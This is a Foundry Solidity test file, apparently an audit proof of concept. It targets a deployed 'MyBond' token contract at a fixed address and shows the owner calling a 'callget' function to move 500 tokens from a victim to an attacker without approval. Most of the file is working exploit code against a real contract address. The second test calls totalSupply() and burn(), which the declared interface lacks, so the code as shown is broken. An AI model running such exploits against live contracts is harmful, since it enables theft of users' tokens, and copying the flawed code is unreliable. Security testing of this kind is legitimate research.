```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function callget(address _from, address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    IMyBond bond = IMyBond(TARGET);

    address owner;
    address attacker = address(0xdead);
    address victim = address(0xbeef);

    function setUp() public {
        // Label addresses
        vm.label(TARGET, "MyBond");
        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Get the current owner of the contract
        owner = bond.owner();
        vm.label(owner, "Owner");

        // Fund accounts with BNB (not strictly required for token operations)
        vm.deal(attacker, 1 ether);
        vm.deal(victim, 1 ether);

        // Mint tokens to victim using owner's privilege (mint is onlyOperator, operator is owner initially)
        vm.startPrank(owner);
        bond.mint(victim, 1000 ether);
        vm.stopPrank();
    }

    function testCallgetDrain() public {
        // Ensure victim has tokens
        assertEq(bond.balanceOf(victim), 1000 ether);

        // Attacker initially has 0
        assertEq(bond.balanceOf(attacker), 0);

        // Owner uses callget to transfer tokens from victim to attacker without approval
        vm.prank(owner);
        bond.callget(victim, attacker, 500 ether);

        // Check balances after exploit
        assertEq(bond.balanceOf(victim), 500 ether);
        assertEq(bond.balanceOf(attacker), 500 ether);
    }

    // Optional secondary test showing redundant burn override (gas waste)
    function testBurnRedundancy() public {
        // This test demonstrates that the burn override is exactly the same as the parent
        // (not a security issue, but illustrates the RCS finding)
        uint256 supplyBefore = bond.totalSupply();
        uint256 balanceBefore = bond.balanceOf(owner);
        
        vm.prank(owner);
        bond.burn(100 ether);
        
        assertEq(bond.totalSupply(), supplyBefore - 100 ether);
        assertEq(bond.balanceOf(owner), balanceBefore - 100 ether);
        // No extra checks needed; the override is purely cosmetic
    }
}
```
